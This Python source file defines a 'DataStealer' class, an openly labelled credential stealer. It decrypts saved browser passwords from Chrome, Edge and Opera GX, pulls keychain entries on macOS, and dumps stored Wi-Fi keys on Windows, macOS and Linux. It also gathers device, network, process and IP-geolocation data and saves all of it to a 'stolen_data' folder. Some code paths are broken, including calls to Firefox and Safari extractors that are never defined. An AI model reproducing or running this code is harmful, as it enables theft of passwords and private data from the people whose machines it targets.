from colorama import init, Fore, Style
import os
import platform
import datetime
import json
import sqlite3
import subprocess
import shutil
import socket
from urllib.request import urlopen
import requests
import psutil
import base64
import re

try:
    import win32.win32crypt as win32crypt
    from Crypto.Cipher import AES
except ImportError:
    pass 

try:
    import keyring  
except ImportError:
    pass  

class DataStealer:
    def __init__(self):
        """
        Initializes the DataStealer class.
        """
        self.os_name = platform.system()
        self.folder_path = self.create_output_folder()

    def create_output_folder(self):
        """
        Creates a unique folder to store all collected data.
        """
        base_folder_path = "reports/stolen_data"
        os.makedirs(base_folder_path, exist_ok=True)

        device_name = platform.node()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        folder_name = f"{device_name}_{timestamp}"
        folder_path = os.path.join(base_folder_path, folder_name)
        os.makedirs(folder_path, exist_ok=True)

        return folder_path

    def gather_device_info(self):
        """
        Gathers detailed device information such as OS, architecture, processor, etc.
        """
        device_info = {
            "System": platform.system(),
            "Node Name": platform.node(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Platform": platform.platform(),
            "Uname": platform.uname()._asdict()
        }
        self.save_to_file("device_info.json", device_info)
        print(f"{Style.BRIGHT}{Fore.GREEN}Device information gathered and saved.")

    def gather_network_info(self):
        """
        Gathers network-related information including IP, MAC address, active connections, etc.
        """
        network_info = {
            "Hostname": socket.gethostname(),
            "Local IP": socket.gethostbyname(socket.gethostname()),
            "Interfaces": psutil.net_if_addrs(),
            "Connections": [conn._asdict() for conn in psutil.net_connections()]
        }

        self.save_to_file("network_info.json", network_info)
        print(f"{Style.BRIGHT}{Fore.GREEN}Network information gathered and saved.")

    def detect_installed_browsers(self):
        """
        Detects installed browsers on the system.
        """
        browsers = []
        if shutil.which("chrome") or os.path.exists(os.path.expanduser('~/AppData/Local/Google/Chrome')):
            browsers.append("Chrome")
        if shutil.which("firefox") or os.path.exists(os.path.expanduser('~/AppData/Roaming/Mozilla/Firefox')):
            browsers.append("Firefox")
        if shutil.which("msedge") or os.path.exists(os.path.expanduser('~/AppData/Local/Microsoft/Edge')):
            browsers.append("Edge")
        if platform.system() == "Darwin" and os.path.exists("/Applications/Safari.app"):
            browsers.append("Safari")
        if os.path.exists(os.path.expanduser('~/AppData/Roaming/Opera Software/Opera GX Stable')):
            browsers.append("OperaGX")

        return browsers

    def extract_browser_passwords(self, browsers):
        """
        Extracts stored passwords from detected browsers.
        """
        passwords_folder = os.path.join(self.folder_path, "passwords")
        os.makedirs(passwords_folder, exist_ok=True)

        for browser in browsers:
            try:
                if browser == "Chrome":
                    self.extract_chrome_passwords(passwords_folder)
                elif browser == "Firefox":
                    self.extract_firefox_passwords(passwords_folder)
                elif browser == "Edge":
                    self.extract_edge_passwords(passwords_folder)
                elif browser == "Safari":
                    self.extract_safari_passwords(passwords_folder)
                elif browser == "OperaGX":
                    self.extract_opera_gx_passwords(passwords_folder)
            except Exception as e:
                print(f"{Style.BRIGHT}{Fore.RED}Failed to extract passwords from {browser}: {e}")

    # ----------------- Windows-Specific Functions ----------------- #
    
    def get_chrome_encryption_key(self):
        """
        Retrieves the encryption key used to encrypt Chrome passwords from the Local State file on Windows.
        """
        local_state_path = os.path.expanduser(
            '~/AppData/Local/Google/Chrome/User Data/Local State')
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key

    def decrypt_chrome_password(self, buff, key):
        """
        Decrypts the Chrome password using the AES key on Windows.
        """
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}Error decrypting password: {e}")
            return ""

    def extract_chrome_passwords(self, output_folder):
        """
        Extracts stored passwords from Google Chrome on Windows.
        """
        try:
            chrome_path = os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Default/Login Data')
            if not os.path.exists(chrome_path):
                print("Chrome Login Data not found.")
                return

            key = self.get_chrome_encryption_key()
            shutil.copy2(chrome_path, 'LoginData')
            conn = sqlite3.connect('LoginData')
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()

            passwords = []
            for origin_url, username, encrypted_password in rows:
                if encrypted_password:
                    decrypted_password = self.decrypt_chrome_password(encrypted_password, key)
                    passwords.append({"url": origin_url, "username": username, "password": decrypted_password})

            output_path = os.path.join(output_folder, "chrome_passwords.json")
            with open(output_path, "w") as file:
                json.dump(passwords, file, indent=4)
            print(f"{Style.BRIGHT}{Fore.GREEN}Chrome passwords extracted and saved.")
        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}Error extracting Chrome passwords: {e}")
        finally:
            cursor.close()
            conn.close()
            os.remove('LoginData')

    def extract_edge_passwords(self, output_folder):
        """
        Extracts stored passwords from Microsoft Edge on Windows.
        """
        try:
            edge_path = os.path.expanduser('~/AppData/Local/Microsoft/Edge/User Data/Default/Login Data')
            if not os.path.exists(edge_path):
                print("Edge Login Data not found.")
                return

            key = self.get_chrome_encryption_key()  # Edge uses the same encryption key as Chrome on Windows
            shutil.copy2(edge_path, 'LoginData')
            conn = sqlite3.connect('LoginData')
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()

            passwords = []
            for origin_url, username, encrypted_password in rows:
                if encrypted_password:
                    decrypted_password = self.decrypt_chrome_password(encrypted_password, key)
                    passwords.append({"url": origin_url, "username": username, "password": decrypted_password})

            output_path = os.path.join(output_folder, "edge_passwords.json")
            with open(output_path, "w") as file:
                json.dump(passwords, file, indent=4)
            print(f"{Style.BRIGHT}{Fore.GREEN}Edge passwords extracted and saved.")
        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}Error extracting Edge passwords: {e}")
        finally:
            cursor.close()
            conn.close()
            os.remove('LoginData')

    def extract_opera_gx_passwords(self, output_folder):
        """
        Extracts stored passwords from Opera GX on Windows.
        """
        try:
            opera_gx_path = os.path.expanduser('~/AppData/Roaming/Opera Software/Opera GX Stable/Login Data')
            if not os.path.exists(opera_gx_path):
                print("Opera GX Login Data not found.")
                return

            key = self.get_chrome_encryption_key()  # Opera GX uses the same encryption key as Chrome on Windows
            shutil.copy2(opera_gx_path, 'LoginData')
            conn = sqlite3.connect('LoginData')
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()

            passwords = []
            for origin_url, username, encrypted_password in rows:
                if encrypted_password:
                    decrypted_password = self.decrypt_chrome_password(encrypted_password, key)
                    passwords.append({"url": origin_url, "username": username, "password": decrypted_password})

            output_path = os.path.join(output_folder, "opera_gx_passwords.json")
            with open(output_path, "w") as file:
                json.dump(passwords, file, indent=4)
            print(f"{Style.BRIGHT}{Fore.GREEN}Opera GX passwords extracted and saved.")
        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}Error extracting Opera GX passwords: {e}")
        finally:
            cursor.close()
            conn.close()
            os.remove('LoginData')

    def extract_wifi_passwords_windows(self):
        """
        Retrieves stored Wi-Fi profiles and their passwords on a Windows machine.
        """
        try:
            profiles_data = subprocess.check_output('netsh wlan show profiles').decode('utf-8').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in profiles_data if "All User Profile" in i]

            wifi_passwords = {}

            for profile in profiles:
                profile_info = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear').decode('utf-8').split('\n')
                password = None
                for line in profile_info:
                    if "Key Content" in line:
                        password = line.split(":")[1][1:-1]
                        break
                wifi_passwords[profile] = password or "No password stored"

            self.save_to_file("wifi_passwords_windows.json", wifi_passwords)
            print(f"{Style.BRIGHT}{Fore.GREEN}Wi-Fi passwords extracted and saved.")
        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}An error occurred while retrieving Wi-Fi passwords: {e}")

    # ----------------- macOS-Specific Functions ----------------- #

    def extract_safari_passwords(self, output_folder):
        """
        Extracts stored passwords from Safari (macOS only).
        """
        try:
            passwords = []
            for item in keyring.get_keyring().get_all_keychain_items():
                passwords.append({"url": item.service, "username": item.username, "password": item.password})

            output_path = os.path.join(output_folder, "safari_passwords.json")
            with open(output_path, "w") as file:
                json.dump(passwords, file, indent=4)
            print(f"{Style.BRIGHT}{Fore.GREEN}Safari passwords extracted and saved.")
        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}Error extracting Safari passwords: {e}")

    def extract_wifi_passwords_macos(self):
        """
        Retrieves stored Wi-Fi passwords on a macOS machine using Keychain access.
        """
        try:
            wifi_passwords = {}
            profiles_data = subprocess.check_output("security find-generic-password -ga WiFiProfileName", shell=True, stderr=subprocess.PIPE)
            password = profiles_data.decode('utf-8').split('"')[1]
            wifi_passwords["WiFiProfileName"] = password

            self.save_to_file("wifi_passwords_macos.json", wifi_passwords)
            print(f"{Style.BRIGHT}{Fore.GREEN}Wi-Fi passwords extracted and saved.")
        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}An error occurred while retrieving Wi-Fi passwords: {e}")

    # ----------------- Linux-Specific Functions ----------------- #

    def extract_wifi_passwords_linux(self):
        """
        Retrieves stored Wi-Fi passwords on a Linux machine.
        """
        try:
            wifi_passwords = {}
            path = "/etc/NetworkManager/system-connections/"

            for filename in os.listdir(path):
                with open(os.path.join(path, filename), 'r') as f:
                    content = f.read()
                    ssid = re.search(r'ssid=(.*)', content)
                    psk = re.search(r'psk=(.*)', content)
                    if ssid and psk:
                        wifi_passwords[ssid.group(1)] = psk.group(1)

            self.save_to_file("wifi_passwords_linux.json", wifi_passwords)
            print(f"{Style.BRIGHT}{Fore.GREEN}Wi-Fi passwords extracted and saved.")
        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}An error occurred while retrieving Wi-Fi passwords: {e}")

    def gather_localization(self):
        """
        Attempts to gather localization data using public IP-based geolocation.
        """
        try:
            public_ip = urlopen('https://api.ipify.org').read().decode('utf8')
            geo_info = requests.get(f"https://ipinfo.io/{public_ip}/json").json()
            self.save_to_file("localization.json", geo_info)
            print(f"{Style.BRIGHT}{Fore.GREEN}Localization data gathered and saved.")
        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}Error gathering localization data: {e}")

    def gather_processes(self):
        """
        Gathers a list of currently running processes and services.
        """
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processes.append(proc.info)
        
        self.save_to_file("processes.json", processes)
        print(f"{Style.BRIGHT}{Fore.GREEN}Running processes information gathered and saved.")

    def run(self):
        """
        Main method to run all data gathering functions based on OS.
        """
        try:
            print(f"Detected Operating System: {self.os_name}")

            self.gather_device_info()
            self.gather_network_info()

            if self.os_name == "Windows":
                browsers = self.detect_installed_browsers()
                print(f"Detected Browsers: {browsers}")
                self.extract_browser_passwords(browsers)
                self.extract_wifi_passwords_windows()
            
            elif self.os_name == "Darwin":
                browsers = self.detect_installed_browsers()
                print(f"Detected Browsers: {browsers}")
                self.extract_browser_passwords(browsers)
                self.extract_wifi_passwords_macos()

            elif self.os_name == "Linux":
                self.extract_wifi_passwords_linux()

            self.gather_localization()
            self.gather_processes()
            print(f"{Style.BRIGHT}{Fore.GREEN}All data collection tasks completed successfully.")

        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}An error occurred while running the Data Stealer: {e}")

    def save_to_file(self, filename, data):
        """
        Save the provided data to a file within the created folder.
        """
        file_path = os.path.join(self.folder_path, filename)
        with open(file_path, "w") as file:
            json.dump(data, file, indent=4)
        print(f"{Style.BRIGHT}{Fore.GREEN}Data saved to {file_path}")

if __name__ == "__main__":
    data_stealer = DataStealer()
    data_stealer.run()
